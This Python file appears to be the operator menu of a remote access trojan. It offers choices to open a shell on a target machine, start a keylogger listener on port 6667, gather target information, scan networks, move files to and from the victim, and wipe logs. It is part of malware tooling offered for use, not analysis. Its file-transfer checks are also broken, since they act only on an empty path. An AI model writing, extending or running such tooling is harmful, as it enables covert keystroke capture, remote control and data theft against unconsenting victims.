from colorama import Fore
import getpass
import tools
import Network
import os
import resource
import time


def main_menu(secure_communication, ip, log_file_name, is_keylogger_on):
    msg_menu = "\n" + getpass.getuser() + "@"+ip+" # "
    is_exit = False

    while not is_exit:
        try:
            user_choice = input(msg_menu)
            print()
            user_choice = int(user_choice)
            if user_choice == 1:
                print("\n[i] Open shell !!")
                tools.run_py_script("shell.py", log_file_name)
                return "shell"

            elif user_choice == 2:
                if not is_keylogger_on:
                    print("\n[i] Starting keylogger !!")
                    keylogger_obj = Network.KeyloggerManager("0.0.0.0", 6667)
                    keylogger_obj.start()
                    is_keylogger_on = True
                    return "keylogger"
                else:
                    print("\n[i] keylogger still running !")
            elif user_choice == 3:
                print("\nGet target machine infos !!")
                return "GetInfos"

            elif user_choice == 4:
                ip_address = input(
                    "\nIp address or network (e.g. 192.168.1.1 or 192.168.1.0/24)>")
                print("[i] Please wait...")
                return "NetDiscovery" + ip_address

            elif user_choice == 5:
                tools.open_notepad(log_file_name)

            elif user_choice == 6:
                return "GetLog"

            elif user_choice == 7:
                tools.open_notepad("keylogger.log")

            elif user_choice == 8:
                try:
                    open(log_file_name, 'w').close()
                    open("keylogger.log", 'w').close()
                    open("clientlog.log", 'w').close()
                except:
                    pass
                return "ClearLog"

            elif user_choice == 9:
                file_path = input("Path to the file to download: ")
                if file_path is "":
                    secure_communication.download_file(file_path)
                else:
                    print(Fore.RED + "[X] Invalid input ! ")
            elif user_choice == 10:
                file_path = input("Path to the file to upload: ")
                if file_path is "":
                    secure_communication.upload_file(file_path)
                else:
                    print(Fore.RED + "[X] Invalid input ! ")
            elif user_choice == 42:
                os.system('cls')
                print(resource.eastereggs)
                time.sleep(1)
                os.system('cls')
                print(resource.frame_menu)

            elif user_choice == 98:
                os.system('cls')
                print(resource.frame_menu)

            elif user_choice == 99:
                print("\nExiting...")
                print("See ya ASAP :)")
                is_exit = True
            else:
                print(Fore.RED + '[X] Error: Bad Entry (command not found) !')

        except ValueError:
            print(Fore.RED + '[X] Error: Bad Entry (command not found) !')
            pass

    return "q"
